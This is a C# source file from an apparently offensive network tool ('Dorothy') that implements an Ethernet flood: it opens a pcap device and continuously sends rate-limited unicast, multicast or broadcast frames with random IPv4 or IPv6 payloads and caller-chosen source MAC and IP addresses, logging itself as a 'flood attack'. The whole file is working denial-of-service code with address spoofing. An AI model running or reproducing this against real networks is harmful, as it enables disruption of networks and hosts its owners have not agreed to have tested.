using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using NLog;
using System.Diagnostics;

namespace Dorothy.Models
{
    public class EthernetFlood : IDisposable
    {
        private readonly PacketParameters _parameters;
        private readonly CancellationToken _cancellationToken;
        private readonly EthernetPacketType _packetType;
        private readonly bool _useIPv6;
        private LibPcapLiveDevice? _device;
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private const int PacketSize = 1400; // Standard size for good throughput
        private const int MICRO_BATCH_SIZE = 10; // Send packets in small batches for better rate control

        public enum EthernetPacketType
        {
            Unicast,
            Multicast,
            Broadcast
        }

        public EthernetFlood(PacketParameters parameters, EthernetPacketType packetType, CancellationToken cancellationToken, bool useIPv6 = false)
        {
            _parameters = parameters;
            _packetType = packetType;
            _cancellationToken = cancellationToken;
            _useIPv6 = useIPv6 || parameters.SourceIp.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6;
        }

        public async Task StartAsync()
        {
            try
            {
                var allDevices = CaptureDeviceList.Instance;
                _device = allDevices.OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Interface.Addresses
                        .Any(a => a.Addr?.ipAddress?.ToString() == _parameters.SourceIp.ToString()));

                if (_device == null)
                {
                    throw new Exception("No suitable network interface found");
                }

                _device.Open();
                Logger.Info($"Started Ethernet {_packetType} flood attack ({(_useIPv6 ? "IPv6" : "IPv4")})");

                // Calculate packet overhead based on IP version
                int packetOverhead = _useIPv6 ? 58 : 38; // Ethernet (14) + IPv6 (40) or IPv4 (20) + minimal headers
                int totalPacketSize = PacketSize + packetOverhead;
                
                // Calculate precise rate: Mbps -> bytes per second (accounting for actual packet size)
                // Target Mbps is for payload + headers, so we calculate packets needed
                long targetBytesPerSecond = _parameters.BytesPerSecond;
                double packetsPerSecond = (double)targetBytesPerSecond / totalPacketSize;
                
                // Use micro-batching for better rate control
                double microBatchDelaySeconds = MICRO_BATCH_SIZE / packetsPerSecond;
                long microBatchDelayTicks = (long)(microBatchDelaySeconds * Stopwatch.Frequency);
                
                var stopwatch = new Stopwatch();
                var packetsSent = 0L;
                var lastRateCheck = DateTime.UtcNow;

                // Pre-generate packet pool for better performance
                var packetPool = new Packet[MICRO_BATCH_SIZE];
                for (int i = 0; i < MICRO_BATCH_SIZE; i++)
                {
                    packetPool[i] = CreatePacket();
                }

                await Task.Run(() =>
                {
                    stopwatch.Start();
                    int poolIndex = 0;
                    
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            var batchStartTicks = stopwatch.ElapsedTicks;
                            
                            // Send micro-batch
                            for (int i = 0; i < MICRO_BATCH_SIZE && !_cancellationToken.IsCancellationRequested; i++)
                            {
                                // Regenerate packet periodically for randomization
                                if (poolIndex % 100 == 0)
                                {
                                    packetPool[i] = CreatePacket();
                                }
                                
                                _device.SendPacket(packetPool[i]);
                                packetsSent++;
                                poolIndex++;
                            }

                            // Precise rate limiting
                            var elapsedTicks = stopwatch.ElapsedTicks - batchStartTicks;
                            if (elapsedTicks < microBatchDelayTicks)
                            {
                                var remainingTicks = microBatchDelayTicks - elapsedTicks;
                                var remainingMicroseconds = (remainingTicks * 1_000_000L) / Stopwatch.Frequency;
                                
                                if (remainingMicroseconds > 1000)
                                {
                                    Thread.Sleep((int)(remainingMicroseconds / 1000));
                                }
                                
                                // Fine-grained spin wait
                                while (stopwatch.ElapsedTicks - batchStartTicks < microBatchDelayTicks)
                                {
                                    if (_cancellationToken.IsCancellationRequested) return;
                                    Thread.SpinWait(10);
                                }
                            }

                            // Log rate every second
                            var now = DateTime.UtcNow;
                            if ((now - lastRateCheck).TotalSeconds >= 1.0)
                            {
                                var actualRate = packetsSent / (now - lastRateCheck).TotalSeconds;
                                var actualMbps = (actualRate * totalPacketSize * 8) / 1_000_000.0;
                                Logger.Info($"Send rate: {actualRate:F0} packets/sec ({actualMbps:F2} Mbps)");
                                packetsSent = 0;
                                lastRateCheck = now;
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error($"Error sending packet: {ex.Message}");
                            throw;
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error($"Ethernet flood attack failed: {ex.Message}");
                throw;
            }
        }

        private Packet CreatePacket()
        {
            var ethernetPacket = CreateEthernetPacket();
            Packet ipPacket;
            
            if (_useIPv6)
            {
                ipPacket = CreateIPv6Packet();
            }
            else
            {
                ipPacket = CreateIPv4Packet();
            }
            
            ethernetPacket.PayloadPacket = ipPacket;
            return ethernetPacket;
        }

        private EthernetPacket CreateEthernetPacket()
        {
            PhysicalAddress destMac = _packetType switch
            {
                EthernetPacketType.Unicast => new PhysicalAddress(_parameters.DestinationMac),
                EthernetPacketType.Multicast => _useIPv6 
                    ? PhysicalAddress.Parse("33-33-00-00-00-01") // IPv6 multicast
                    : PhysicalAddress.Parse("01-00-5E-00-00-01"), // IPv4 multicast
                EthernetPacketType.Broadcast => PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                _ => throw new ArgumentException("Invalid Ethernet packet type")
            };

            var etherType = _useIPv6 ? EthernetType.IPv6 : EthernetType.IPv4;

            return new EthernetPacket(
                new PhysicalAddress(_parameters.SourceMac),
                destMac,
                etherType);
        }

        private IPv4Packet CreateIPv4Packet()
        {
            var payload = new byte[PacketSize];
            Random.Shared.NextBytes(payload);

            return new IPv4Packet(_parameters.SourceIp, _parameters.DestinationIp)
            {
                Protocol = ProtocolType.Raw,
                PayloadData = payload,
                TimeToLive = _parameters.Ttl
            };
        }

        private IPv6Packet CreateIPv6Packet()
        {
            var payload = new byte[PacketSize];
            Random.Shared.NextBytes(payload);

            return new IPv6Packet(_parameters.SourceIp, _parameters.DestinationIp)
            {
                PayloadData = payload,
                HopLimit = _parameters.Ttl
            };
        }

        public void Dispose()
        {
            if (_device != null)
            {
                if (_device.Opened)
                {
                    _device.Close();
                }
                _device.Dispose();
                Logger.Info("Ethernet flood device closed and disposed");
            }
        }
    }
} 